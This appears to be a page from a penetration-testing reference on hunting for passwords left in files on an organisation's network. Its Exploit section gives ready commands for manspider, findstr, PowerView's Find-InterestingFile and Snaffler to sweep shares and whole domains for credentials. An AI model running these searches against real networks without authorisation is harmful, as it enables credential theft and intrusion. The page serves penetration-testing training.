## Theory
In organization networks, it is common to find passwords in random files (logs, config files, personal documents, Office documents, ...). Other credential dumping techniques (SAM & LSA, NTDS.dit, some web browsers, ...) could be considered as sub-techniques of credential dumping from files. 
## Exploit
=== "UNIX-like"
    From UNIX-like systems, the [manspider](https://github.com/blacklanternsecurity/MANSPIDER) (Python) tool can be used to find sensitive information across a number of shares.
    ```bash
    manspider.py --threads 50 $IP_RANGE/$MASK -d $DOMAIN -u $USER -p $PASSWORD --content "set sqlplus" "password ="
    ```
=== "Windows"
    From Windows systems, the following commands should help find interesting information across local files and network shares.
    ```bash
    findstr /snip password *.xml *.ini *.txt
    findstr /snip password *
    ```
    PowerSploit's [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) (Powershell) module can be used to find interesting files as well.
    ```bash
    Find-InterestingFile -LastAccessTime (Get-Date).AddDays(-7)
    Find-InterestingFile -Include "private,confidential"
    Find-InterestingFile -Path "\\$SERVER\$Share" -OfficeDocs
    ```
    one of the best tools to find sensitive information across a number of shares and local files is [Snaffler](https://github.com/SnaffCon/Snaffler) (C#).
    ```bash
    # Snaffle all the computers in the domain
    ./Snaffler.exe -d domain.local -c  -s

    # Snaffle specific computers
    ./Snaffler.exe -n computer1,computer2 -s

    # Snaffle a specific directory
    ./Snaffler.exe -i C:\ -s
    ```